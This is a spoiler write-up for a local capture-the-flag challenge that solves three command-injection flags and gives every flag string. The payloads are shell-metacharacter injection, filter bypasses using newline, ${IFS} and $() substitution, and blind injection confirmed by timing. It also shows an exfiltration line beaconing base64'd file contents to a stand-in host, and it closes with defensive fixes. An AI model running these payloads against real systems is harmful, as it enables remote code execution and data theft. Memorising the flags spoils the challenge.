# 🚩 NetProbe — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

## Flag 1 — Plain injection (`FLAG{c0mm4nd_1nj3ct10n_15_rc3}`)

`/ping` runs `ping -c 1 <host>` through the shell and reflects output. Chain a command:

```bash
curl -sG http://localhost:8091/ping --data-urlencode 'host=127.0.0.1; cat /flag1.txt' \
  | grep -o 'FLAG{[^}]*}'
```

Browser: `http://localhost:8091/ping?host=127.0.0.1;cat /flag1.txt`. The `cat` output
appears in the `<pre>`. → `FLAG{c0mm4nd_1nj3ct10n_15_rc3}`

(This endpoint's shell runs as `u1`; `/flag2.txt` and `/flag3.txt` are owned by other
users and mode-400, so `cat`-ing them here fails with *Permission denied*.)

## Flag 2 — Filter breakout, no `; & | ` backtick or space (`FLAG{f1lt3r_byp4ss3d_w1th_IFS}`)

`/lookup` blocks `;`, `&`, `|`, `` ` `` and space. Two clean bypasses:

**(a) Newline separator + `${IFS}` for the space.** URL-encode newline as `%0a`:

```bash
curl -sG http://localhost:8091/lookup \
  --data-urlencode $'domain=x\ncat${IFS}/flag2.txt' | grep -o 'FLAG{[^}]*}'
```

The shell sees two lines — `nslookup x` then `cat /flag2.txt` — and `${IFS}` expands to
whitespace, so no literal space is needed.

**(b) Command substitution.** No separator at all; `$(...)` runs inline:

```bash
curl -sG http://localhost:8091/lookup \
  --data-urlencode 'domain=$(cat${IFS}/flag2.txt)' | grep -o 'FLAG{[^}]*}'
```

`nslookup` fails to resolve the flag text and echoes it back in the error. Either way →
`FLAG{f1lt3r_byp4ss3d_w1th_IFS}`. (Brace form `{cat,/flag2.txt}` also dodges the space.)

**Lesson:** blacklists don't work — there's always another separator or whitespace
substitute. Use an argument vector and no shell.

## Flag 3 — Blind injection, file exfil (`FLAG{bl1nd_1nj3ct10n_f1l3_3xf1l}`)

`/monitor` injects but discards output. **Confirm** blind execution with timing:

```bash
time curl -sG http://localhost:8091/monitor --data-urlencode 'target=127.0.0.1; sleep 5'
# ~5s hang => injection confirmed
```

**Exfil** by having the worker (running as `u3`, the only user who can read `/flag3.txt`)
copy the flag into the public spool `/app/public`, then read it over HTTP:

```bash
curl -sG http://localhost:8091/monitor \
  --data-urlencode 'target=127.0.0.1; cp /flag3.txt /app/public/leak.txt'
curl -s http://localhost:8091/public/leak.txt
```

→ `FLAG{bl1nd_1nj3ct10n_f1l3_3xf1l}`

(No side channel handy in a real target? Beacon it: `... ; curl http://YOU/$(cat /flag3.txt | base64)` or a DNS lookup of the base64'd flag. Here the app's own `/public/` route is the simplest read-back.)

**Lesson:** blind sinks are still RCE. Absence of reflected output is not a mitigation —
attackers use timing, filesystem drops, and OOB (HTTP/DNS) callbacks to confirm and
extract.

---

### Full flag list
1. `FLAG{c0mm4nd_1nj3ct10n_15_rc3}`   — plain injection, `; cat /flag1.txt`
2. `FLAG{f1lt3r_byp4ss3d_w1th_IFS}`   — newline / `$()` + `${IFS}` to dodge the blacklist
3. `FLAG{bl1nd_1nj3ct10n_f1l3_3xf1l}` — confirm via `sleep`, exfil via `/app/public`

### The one fix that kills all three
Don't pass user input to a shell. Use an exec argument vector
(`subprocess.run(["ping","-c","1",host])`, no `shell=True`), allow-list the input
(e.g. validate it's a hostname/IP), and least-privilege the worker so a miss is contained.
